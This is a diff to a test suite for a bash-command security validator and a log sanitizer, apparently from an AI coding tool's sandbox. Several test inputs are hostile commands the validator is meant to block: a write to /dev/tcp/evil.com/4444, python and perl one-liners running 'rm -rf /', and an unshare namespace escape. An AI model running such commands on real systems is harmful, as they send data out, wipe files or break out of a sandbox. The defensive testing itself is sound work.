@@ -320,24 +320,26 @@ describe('Bash Command Security', () => {
   });
 
   describe('Command Logging Sanitization', () => {
-    it('should redact API keys in logs', () => {
+    it('should replace commands containing API keys with structural identity', () => {
       const sanitized = sanitizeCommandForLogging(
         "curl -H 'Authorization: Bearer SECRET_TOKEN' https://api.example.com",
       );
       expect(sanitized).not.toContain('SECRET_TOKEN');
+      expect(sanitized).toContain('curl [category=network;');
+      expect(sanitized).toMatch(/sha256=[a-f0-9]{64}/);
     });
 
-    it('should redact passwords in logs', () => {
+    it('should retain no password-bearing command text', () => {
       const sanitized = sanitizeCommandForLogging('command password=mysecret');
-      expect(sanitized).toContain('***');
       expect(sanitized).not.toContain('mysecret');
+      expect(sanitized).not.toContain('password=');
     });
 
-    it('should truncate long commands', () => {
+    it('should keep arbitrarily long commands bounded', () => {
       const longCommand = 'a'.repeat(500);
       const sanitized = sanitizeCommandForLogging(longCommand);
-      expect(sanitized.length).toBeLessThan(250);
-      expect(sanitized).toContain('[truncated]');
+      expect(sanitized.length).toBeLessThan(200);
+      expect(sanitized).not.toContain(longCommand);
     });
   });
 
@@ -527,7 +529,9 @@ describe('Bash Command Security', () => {
     });
 
     it('blocks using printf to write to file descriptors', () => {
-      const result = validateBashCommand('printf "data" > /dev/tcp/evil.com/4444', { isSandboxed: true });
+      const result = validateBashCommand('printf "data" > /dev/tcp/evil.com/4444', {
+        isSandboxed: true,
+      });
       expect(result.safe).toBe(false);
     });
 
@@ -542,10 +546,10 @@ describe('Bash Command Security', () => {
     });
 
     it('blocks using python/perl/ruby to execute arbitrary code', () => {
-      const result1 = validateBashCommand('python -c "import os; os.system(\'rm -rf /\')"',
-        { isSandboxed: true });
-      const result2 = validateBashCommand('perl -e "system(\'rm -rf /\')"',
-        { isSandboxed: true });
+      const result1 = validateBashCommand('python -c "import os; os.system(\'rm -rf /\')"', {
+        isSandboxed: true,
+      });
+      const result2 = validateBashCommand('perl -e "system(\'rm -rf /\')"', { isSandboxed: true });
       expect(result1.safe).toBe(false);
       expect(result2.safe).toBe(false);
     });
@@ -556,7 +560,9 @@ describe('Bash Command Security', () => {
     });
 
     it('blocks using unshare to create a new namespace and escape', () => {
-      const result = validateBashCommand('unshare --pid --fork --mount-proc bash', { isSandboxed: true });
+      const result = validateBashCommand('unshare --pid --fork --mount-proc bash', {
+        isSandboxed: true,
+      });
       expect(result.safe).toBe(false);
     });
 
